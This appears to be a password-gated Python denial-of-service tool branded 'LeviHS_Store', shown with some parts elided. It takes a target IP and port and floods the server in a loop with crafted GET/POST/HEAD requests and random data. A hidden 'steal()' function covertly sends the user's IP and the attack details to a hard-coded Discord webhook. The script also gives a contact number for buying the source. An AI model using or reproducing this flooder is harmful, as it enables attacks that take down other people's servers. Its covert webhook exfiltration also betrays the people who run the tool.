...
import os
import requests
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By LeviHS_Store [ What Password ]")
password = input("[ + ] Password : ")
if password == "ddostools":
    print("[ ✔ ] Unlock Enjoy DoS server")
    time.sleep(2)
else :
    print("[ ❌ ] Locked Password Wrong !")
    time.sleep(1000)
...
referers = [
     'Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender',
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By LeviHS_Store [ DDoS Attack ]")
print("============================================================")
print(" ▄▀▀█▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄   ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▄ ")
print("█   █  █ █   █    ▐  █ ▐ ▄▀ ▀▄ █ █   ▐ █  █   ▄▀ █   █    █ █  █ ▀  █ ▐ ▄▀ ▀▄ █  █ █ █ ")
print("▐   █  ▐ ▐  █        █   █▄▄▄█    ▀▄   ▐  █▄▄▄█  ▐  █    █  ▐  █    █   █▄▄▄█ ▐  █  ▀█ ")
...
print("▐       ▐                               ▐   ▐               ▐    ▐            ▐        ")
print("============================================================")
print("[ + ] Author/Use : LeviHS")
print("[ + ] Don't Leak This Tools")
print("[ + ] Source For 9Dls Contact : 0859-5537-2133")
print("Tips : Packet 150-250k")
print("Tips : Thread 18048-80535")
print("Tips : Port 80, 17091, 3389")
print("==========================")
ip = str(input("[+] Target IP : "))
port = int(input("[+] Port [80] : "))
method_attack = str(input("[+] Method [ get ] : "))
...
def Headers(method):
    header = ""
    if method == "get" or method == "head" or method == "udp":
        post_host = "POST /Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def steal():
    ...
    dat = {"content": "```IP ADDRESS: " + ips + "Attacking Info : " + ip + " At Port " + str(port) + " With Packet : " + str(times) + " And Thread : ```" + str(threads)}
    response = requests.post("https://discord.com/api/webhooks/861015204623548436/uD3jICg9a3yhj82IR73dGd9uoCpyTOyoxds0QHm46yrGKqeTeKqPU0VLiymmPmNcmJ1e", json=dat)

os.system('color ' +random.choice(['A'])+ " & cls & title Tools DDoS Used By LeviHS_Store [ DDoS Attack ]")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(20817)#65535
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_IWashuman_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("[ + ] [ SYSTEM ] Server Attacking || @levihs_store Tools || Attacking Server IP => ",ip," || In Port ",port,"!")
steal()
